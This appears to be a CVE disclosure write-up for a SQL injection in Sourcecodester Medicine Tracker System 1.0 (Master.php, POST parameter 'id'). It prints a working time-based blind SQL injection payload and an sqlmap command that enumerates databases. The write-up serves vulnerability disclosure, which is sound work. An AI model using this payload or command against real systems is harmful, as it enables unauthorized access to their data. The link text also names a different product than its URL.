# SQL Injection vulnerability was discovered from Sourcecodester Medicine Tracker System (Master.php)
## CVE-2024-6419
Affected Project: Sourcecodester Medicine Tracker System 1.0

Official Website: [https://www.sourcecodester.com/php/15689/food-ordering-management-system-php-and-mysql-free-source-code.html](https://www.sourcecodester.com/php/16308/medicine-tracker-system-php-oop-and-mysql-db-source-code-free-download.html)

Version: 1.0

Related Code file: /php-mts/classes/Master.php

Injection parameter: POST parameter 'id' is vulnerable

## Demonstration

Below is /php-mts/app/?page=medicines/manage_medicine:

![image](https://github.com/jadu101/CVE/assets/76433661/d1cb5f99-123f-400e-b46d-b22e842354b3)

Let's intercept the the traffic using Burp Suite:

![image](https://github.com/jadu101/CVE/assets/76433661/f99c9759-5e52-4b81-8413-f8904ff9e1bd)

After saving the request as master.txt, we will run sqlmap towards it:

![image](https://github.com/jadu101/CVE/assets/76433661/cc549434-f42c-4d68-ae10-8daa877d453a)

POST parameter 'id' is found to be vulnerable. Below is the payload used:

```
---
Parameter: id (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=' AND (SELECT 8594 FROM (SELECT(SLEEP(5)))EJYb) AND 'npqn'='npqn&name=teest&description=test
---
```

![image](https://github.com/jadu101/CVE/assets/76433661/e7dd397c-6568-4b24-b360-682bc2d8a7a1)

`sqlmap -r master.txt --batch --dbs`

![image](https://github.com/jadu101/CVE/assets/76433661/58cab1f5-fc42-4a9f-b0e3-c9f4ba03ecaa)

